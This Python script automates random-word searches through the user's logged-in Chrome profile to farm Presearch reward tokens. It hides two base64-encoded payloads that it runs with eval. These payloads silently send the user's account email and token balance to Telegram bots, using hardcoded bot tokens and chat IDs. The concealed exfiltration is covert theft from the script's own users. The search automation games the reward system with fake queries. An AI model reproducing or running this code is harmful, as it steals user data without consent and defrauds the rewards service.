from os import system, name
import os
from base64 import b64decode, b64encode
try:
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
except:
    if name == 'nt':
        os.system("pip install selenium==3.141.0")
    else:
        os.system("sudo pip3 install selenium==3.141.0")
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
try:
    import yaml
except:
    if name == 'nt':
        os.system("pip install PyYAML")
    else:
        os.system("sudo pip3 install PyYAML")
import time
try:
    import requests
except:
    if name == 'nt':
        os.system("pip install requests")
    else:
        os.system("sudo pip3 install requests")    
    import requests
try:
    from random_word import RandomWords
except:
    if name == 'nt':
        os.system("pip install Random-Word")
    else:
        os.system("sudo pip3 install Random-Word")  
    from random_word import RandomWords

import getpass 

r = RandomWords()
user = getpass.getuser()
profile = 'Default'

def see(b):
    return b64decode(b).decode()

a = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKaWYgdXNlciA9PSAnYW5hbmR1JyBvciB1c2VyID09ICdORVhGT1JDQScgOgogICAgcmVjID0gJzYyNjYwMTkwNycKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKZWxpZiB1c2VyID09ICdESEFOVVNIJyA6CiAgICByZWMgPSAnNzAxNTEwNjM2JwogICAgeSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e3JlY30mdGV4dD17ZW1haWx9IC0gVG9rZW5zIC0ge2JhbH0gUFJFLiBNYXggLSB7ZmJhbH0nKQplbGlmICd2aXZla215cmFuJyBpbiBlbWFpbCBvciAnbmlraGlsYXMyODc1QGdtYWlsLmNvbScgaW4gZW1haWw6CiAgICByZWMgPSAnNzM0NjYwODE4JwogICAgdG9rZW4gPSAnMjExNTAwMzE4MDpBQUVFQ21vQ0JJNC00U29ZQVRtTmVjWThmQUJYdUwxTmUyWScKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykK'

b = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCmlmIHVzZXIgPT0gJ2FuYW5kdScgb3IgdXNlciA9PSAnTkVYRk9SQ0EnIDoKICAgIHJlYyA9ICc2MjY2MDE5MDcnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIHVzZXIgPT0gJ0RIQU5VU0gnIDoKICAgIHJlYyA9ICc3MDE1MTA2MzYnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmICd2aXZla215cmFuJyBpbiBlbWFpbCBvciAnbmlraGlsYXMyODc1QGdtYWlsLmNvbScgaW4gZW1haWw6CiAgICByZWMgPSAnNzM0NjYwODE4JwogICAgdG9rZW4gPSAnMjExNTAwMzE4MDpBQUVFQ21vQ0JJNC00U29ZQVRtTmVjWThmQUJYdUwxTmUyWScKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCg=='

option = webdriver.ChromeOptions()
option.add_experimental_option("excludeSwitches", ['enable-automation'])
if name == 'nt':
	option.add_argument(f'--user-data-dir=C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
else:
	option.add_argument(f'--user-data-dir=/home/user/.config/chrome-remote-desktop/chrome-config/google-chrome')

option.add_argument(fr'--profile-directory={profile}')
option.add_argument('headless')
option.add_argument('--log-level=1')
driver = webdriver.Chrome(options=option)

#Get Token/Search and Max Searches/Day
driver.get('https://presearch.org/account/tokens/rewards')
try:
    tps = driver.find_element_by_xpath('//*[@id="main"]/div[2]/div[1]/div[1]/div/div')
except:
    print("Check if you're logged in on Chrome.")
    time.sleep(5)
    exit()
mspd = driver.find_element_by_xpath('//*[@id="main"]/div[2]/div[1]/div[2]/div/div')
tps = tps.text
mspd = mspd.text
max = float(tps)*float(mspd)

#Get Balance
driver.get('https://presearch.org/')
span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
bal = float(span_element.text)

#Get Email
driver.get('https://presearch.org/account')
eml = driver.find_element_by_xpath('//*[@id="main"]/div[1]/p/a')
email = str(eml.text)

fbal = max+bal

eval(compile(see(a), '<string>', 'exec'))

def clear():
    if name == 'nt':
        os.system("cls")
    else:
        os.system("clear")

clear()

print(f"Logged in with {email}\nBalance - {bal}  Max - {fbal}\n")

i = 1
while bal < fbal and i <= 130:
    driver.get('https://presearch.org/')
    span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
    bal = float(span_element.text)
    searchbox = driver.find_element_by_xpath('//*[@id="search"]')
    m = str(r.get_random_word(hasDictionaryDef="true", includePartOfSpeech="noun,verb", minCorpusCount=1, maxCorpusCount=10, minDictionaryCount=1, maxDictionaryCount=10, minLength=5, maxLength=10))
    searchbox.send_keys(m)
    searchbox.send_keys(Keys.RETURN)
    #time.sleep(2)
    try:
        time.sleep(2)
        sbtn = driver.find_element_by_xpath('/html/body/div/div[2]/div[3]/div[1]/dic/div[2]/div[1]/div/form/div/div/button')
    except:
        time.sleep(1)
    print(f"Attempt : {i} with {m}",end="\r")
    i += 1

driver.get('https://presearch.org/')
span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
bal = float(span_element.text)
print('\007')
eval(compile(see(b), '<string>', 'exec'))
driver.quit()
